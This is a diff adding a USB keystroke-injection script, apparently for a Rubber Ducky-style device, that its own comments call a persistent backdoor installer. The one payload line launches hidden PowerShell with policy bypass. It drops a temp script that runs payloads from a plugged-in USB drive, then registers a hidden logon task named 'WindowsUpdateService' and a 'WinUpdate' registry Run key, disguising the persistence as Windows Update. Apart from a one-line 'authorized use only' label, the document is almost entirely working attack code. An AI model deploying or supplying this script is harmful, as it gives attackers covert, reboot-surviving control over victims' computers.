@@ -1,0 +1,14 @@
+REM ============================================================================
+REM  PERSISTENCE INSTALL — Scheduled Task + Registry Run Key
+REM  ============================================================================
+REM  Installs a persistent backdoor that survives reboot.
+REM  Re-runs the attack chain when the USB is reinserted or on schedule.
+REM  
+REM  FLLC | Authorized use only.
+REM ============================================================================
+
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -W Hidden -NoP -Exec Bypass -C "$s='$d=Get-WmiObject Win32_LogicalDisk -F \"DriveType=2\"|%{$_.DeviceID}|?{Test-Path \"$_\\payloads\"}|Select -First 1;if($d){iex(gc \"$d\\payloads\\autorun_service.ps1\" -Raw)}';$b=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s));$t=\"$env:TEMP\\WinUpdateSvc.ps1\";$s|Out-File $t -Force;$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-NoP -W Hidden -Exec Bypass -File $t\";$tr=New-ScheduledTaskTrigger -AtLogon;$set=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries;Register-ScheduledTask -TaskName 'WindowsUpdateService' -Action $a -Trigger $tr -Settings $set -Force 2>$null;Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinUpdate' -Value \"powershell.exe -NoP -W Hidden -Exec Bypass -File $t\" 2>$null"
+ENTER
